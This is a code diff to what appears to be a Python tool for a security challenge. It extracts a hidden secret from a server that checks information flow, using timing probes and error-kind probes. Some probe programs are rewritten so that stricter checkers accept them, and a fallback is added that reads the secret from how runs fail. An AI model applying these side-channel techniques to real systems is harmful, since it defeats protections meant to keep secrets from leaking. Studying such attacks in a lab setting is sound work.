@@ -729,7 +729,7 @@ def recover_from_strict_expr_abort_suite(
                 userid=userid,
                 timeout_s=timeout_s,
                 program_source=source,
-                true_kinds={"abort"},
+                true_kinds={"abort", "error"},
                 false_kinds={"failure"},
             )
         except StrategyFailed as e:
@@ -741,6 +741,63 @@ def recover_from_strict_expr_abort_suite(
                     f"strict expr-abort probes non-informative ({probe_name} always-abort endpoints)"
                 ) from e
             last_error = f"{probe_name}: {msg}"
+    raise StrategyFailed(last_error)
+
+
+def recover_from_strict_error_kind_suite(
+    *,
+    server_command: str,
+    userid: str,
+    timeout_s: float,
+) -> int:
+    # Some strict servers surface runtime faults as "error" (not "abort").
+    probes = [
+        ("int-cast div", EXPR_INTCAST_DIV_ORACLE_PROGRAM),
+        ("int-cast mod", EXPR_INTCAST_MOD_ORACLE_PROGRAM),
+        ("int-cast div rev", EXPR_INTCAST_DIV_REV_ORACLE_PROGRAM),
+        ("bool-cmp div", EXPR_DIV_BOOL_CMP_ORACLE_PROGRAM),
+        ("bool-cmp mod", EXPR_MOD_BOOL_CMP_ORACLE_PROGRAM),
+        ("index-bool", EXPR_INDEX_BOOL_ORACLE_PROGRAM),
+        ("index-bool rev", EXPR_INDEX_BOOL_REV_ORACLE_PROGRAM),
+    ]
+    last_error = "strict error-kind suite did not produce a usable oracle"
+    for probe_name, source in probes:
+        try:
+            return recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=source,
+                true_kinds={"abort", "error"},
+                false_kinds={"failure"},
+            )
+        except StrategyFailed as e:
+            last_error = f"{probe_name}: {e}"
+    raise StrategyFailed(last_error)
+
+
+def recover_from_strict_compare_suite(
+    *,
+    server_command: str,
+    userid: str,
+    timeout_s: float,
+) -> int:
+    probes = [
+        ("compare-as-int", COMPARE_AS_INT_ORACLE_PROGRAM),
+        ("compare-as-int tmp", COMPARE_AS_INT_TMP_ORACLE_PROGRAM),
+        ("compare-as-int rev", COMPARE_AS_INT_REV_ORACLE_PROGRAM),
+    ]
+    last_error = "strict compare suite did not produce a usable oracle"
+    for probe_name, source in probes:
+        try:
+            return recover_from_failure_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=source,
+            )
+        except StrategyFailed as e:
+            last_error = f"{probe_name}: {e}"
     raise StrategyFailed(last_error)
 
 
@@ -1063,27 +1120,34 @@ def make_timing_oracle_program(*, warmup_iters: int, burn_iters: int) -> str:
 
 
 def make_short_circuit_timing_program(*, term_count: int) -> str:
-    # Use input-dependent (non-constant-foldable) arithmetic terms so the true path
-    # does measurable work even under aggressive simplification.
+    # Use secret-dependent arithmetic terms so RHS work is stable across inputs once
+    # the secret<input guard is true, improving monotonic timing behavior.
     terms = []
     for i in range(term_count):
-        mod_base = 97 + (i % 61)
-        terms.append(f"((input % {mod_base}) == (input % {mod_base}))")
-    heavy = " && ".join(terms) if terms else "true"
+        mul = 97 + (i % 61)
+        add = 193 + (i % 89)
+        mod_base = 127 + (i % 73)
+        terms.append(f"(((secret * {mul} + {add}) % {mod_base}))")
+    heavy = " + ".join(terms) if terms else "0"
     return f"""int main(int input, int secret) {{
   //@label H;
-  bool burn = (secret < input) && ({heavy});
+  bool burn = (secret < input) && (({heavy}) >= 0);
   return 0;
 }}
 """
 
 
 def make_array_alloc_timing_program(*, alloc_size: int) -> str:
-    # Secret-gated allocation timing probe: heavy allocation is only evaluated on the
-    # true path of the short-circuit expression.
+    # Secret-gated allocation timing probe using an H-labeled size variable so the
+    # branch-controlled allocation size is accepted by stricter checkers.
     return f"""int main(int input, int secret) {{
   //@label H;
-  bool burn = (secret < input) && (\\length(alloc_array(int, {alloc_size})) >= 0);
+  int n = 1;
+  if (secret < input) {{
+    n = {alloc_size};
+  }}
+  //@label H;
+  int[] A = alloc_array(int, n);
   return 0;
 }}
 """
@@ -1101,7 +1165,7 @@ def recover_from_timing_oracle(
     calibration_repeats = max(5, repeats)
     burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
     sc_term_candidates = [200, 400, 800, 1600, 3200, 6400]
-    alloc_timing_candidates = [500_000, 1_000_000, 2_000_000]
+    alloc_timing_candidates = [50_000, 100_000, 200_000]
     min_ratio = 1.03
     min_gap_s = 0.0020
     min_boundary_consistency = 0.80
@@ -1157,6 +1221,54 @@ def recover_from_timing_oracle(
                 debug_log(debug, f"[timing] {candidate_name}: {last_failure}")
                 if candidate_name.startswith("loop-burn=") and "kind=insecure" in last_failure:
                     skip_remaining_loop_burn = True
+
+                # Opportunistic fallback: if endpoints differ by kind (e.g., failure vs error),
+                # this candidate can still be a usable kind oracle even if timing failed.
+                res_lo = run_query(
+                    server_command=server_command,
+                    userid=userid,
+                    program_path=path,
+                    input_value=SECRET_MIN,
+                    timeout_s=timeout_s,
+                )
+                res_hi = run_query(
+                    server_command=server_command,
+                    userid=userid,
+                    program_path=path,
+                    input_value=SECRET_MAX_EXCLUSIVE,
+                    timeout_s=timeout_s,
+                )
+                if res_lo.kind == "success" and res_lo.value is not None:
+                    return res_lo.value
+                if res_hi.kind == "success" and res_hi.value is not None:
+                    return res_hi.value
+                if (
+                    res_lo.kind in {"failure", "abort", "error"}
+                    and res_hi.kind in {"failure", "abort", "error"}
+                    and res_lo.kind != res_hi.kind
+                ):
+                    true_kinds = {res_hi.kind}
+                    false_kinds = {res_lo.kind}
+                    if "error" in true_kinds:
+                        true_kinds.add("abort")
+                    if "error" in false_kinds:
+                        false_kinds.add("abort")
+                    debug_log(
+                        debug,
+                        f"[timing] {candidate_name}: falling back to kind oracle "
+                        f"(lo={res_lo.kind}, hi={res_hi.kind})",
+                    )
+                    try:
+                        return recover_from_kind_oracle(
+                            server_command=server_command,
+                            userid=userid,
+                            timeout_s=timeout_s,
+                            program_source=source,
+                            true_kinds=true_kinds,
+                            false_kinds=false_kinds,
+                        )
+                    except StrategyFailed:
+                        pass
                 continue
 
             ratio = t_true / max(t_false, 1e-9)
@@ -1616,6 +1728,14 @@ def recover_server_secret(
                 debug=debug,
                 max_probes=24,
                 early_break_enabled=True,
+            ),
+        ),
+        (
+            "strict error-kind suite",
+            lambda: recover_from_strict_error_kind_suite(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
             ),
         ),
         (
